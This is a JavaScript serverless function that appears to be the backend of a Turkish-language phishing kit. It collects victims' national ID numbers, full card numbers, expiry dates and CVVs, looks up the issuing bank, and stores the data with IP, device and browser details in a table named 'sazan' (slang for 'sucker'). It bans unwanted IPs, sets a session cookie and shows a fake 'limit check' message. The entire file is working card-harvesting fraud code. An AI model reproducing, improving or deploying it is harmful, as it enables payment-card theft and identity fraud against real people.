const { query } = require('../../lib/db');
const { getClientIp } = require('../../lib/ip');
const { detectBrowser, detectDevice } = require('../../lib/userAgent');
const { getIstanbulDateString, getUnixTimestampPlus } = require('../../lib/time');
const { createSessionToken, buildCookie } = require('../../lib/session');

const BANNED_REDIRECT = 'https://www.youtube.com/watch?v=KaInAwef530&ab_channel=AliDemirdal';

function sanitizeNumeric(value = '') {
  return value.replaceAll(/\D/g, '');
}

function validatePayload({ kullanici, ccNo, ccYil, ccCvv }) {
  if (!kullanici || kullanici.length !== 11) {
    return 'T.C. Kimlik numarası hatalı.';
  }

  if (ccNo.length < 12 || ccNo.length > 19) {
    return 'Kart numarası hatalı.';
  }

  if (!ccYil || !/^\d{2}\/?\d{2}$/.test(ccYil)) {
    return 'Son kullanma tarihini AA/YY formatında giriniz.';
  }

  if (ccCvv.length !== 3) {
    return 'CVV kodu 3 haneli olmalıdır.';
  }

  return null;
}

async function fetchBankName(bin) {
  if (bin.length !== 6) return 'Bilinmiyor';
  try {
    const response = await fetch(`https://lookup.binlist.net/${bin}`);
    if (!response.ok) return 'Bilinmiyor';
    const data = await response.json();
    return data?.bank?.name || 'Bilinmiyor';
  } catch (error) {
    console.warn('BIN sorgusu başarısız:', error.message);
    return 'Bilinmiyor';
  }
}

exports.handler = async function handler(event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ message: 'Yalnızca POST istekleri desteklenir.' }),
    };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const kullanici = sanitizeNumeric(body.kullanici || '');
    const ccNo = sanitizeNumeric(body.cc_no || '');
    const ccYil = (body.cc_yil || '').trim();
    const ccCvv = sanitizeNumeric(body.cc_cvv || '');

    const validationError = validatePayload({ kullanici, ccNo, ccYil, ccCvv });
    if (validationError) {
      return { statusCode: 400, body: JSON.stringify({ message: validationError }) };
    }

    const ip = getClientIp(event);
    const userAgent = event.headers['user-agent'] || event.headers['User-Agent'] || '';
    const cihaz = detectDevice(userAgent);
    const tarayici = detectBrowser(userAgent);

    const banCheck = await query('SELECT 1 FROM ban WHERE ban = $1 LIMIT 1', [ip]);
    if (banCheck.rowCount) {
      return {
        statusCode: 403,
        headers: { Location: BANNED_REDIRECT },
        body: JSON.stringify({ status: 'banned', redirectUrl: BANNED_REDIRECT }),
      };
    }

    const bin = ccNo.slice(0, 6);
    const banka = await fetchBankName(bin);

    const tarih = getIstanbulDateString();
    const lastOnline = getUnixTimestampPlus(0);
    const expiresAt = getUnixTimestampPlus(7);
    const sessionToken = createSessionToken();

    const insertResult = await query(
      `INSERT INTO sazan (session_token, date_val, kk, sonkul, cvv, now, back, ip, lastOnline, banka, tc, cihaz, tarayici)
       VALUES ($1, $2, $3, $4, $5, $6, 0, $7, $8, $9, $10, $11, $12)
       RETURNING id`,
      [sessionToken, tarih, ccNo, ccYil, ccCvv, 'Anasayfa', ip, lastOnline, banka, kullanici, cihaz, tarayici],
    );

    if (!insertResult.rowCount) {
      throw new Error('Kayıt oluşturulamadı');
    }

    await query(
      `INSERT INTO ips (ipAddress, lastOnline)
       VALUES ($1, $2)
       ON CONFLICT (ipAddress) DO UPDATE SET lastOnline = EXCLUDED.lastOnline`,
      [ip, expiresAt],
    );

    const headers = {
      'Content-Type': 'application/json',
      'Set-Cookie': buildCookie(sessionToken),
    };

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ status: 'limit', message: 'Limit kontrolüne yönlendiriliyorsunuz.' }),
    };
  } catch (error) {
    console.error('Login fonksiyonu hatası:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: 'Beklenmeyen bir hata oluştu.' }),
    };
  }
};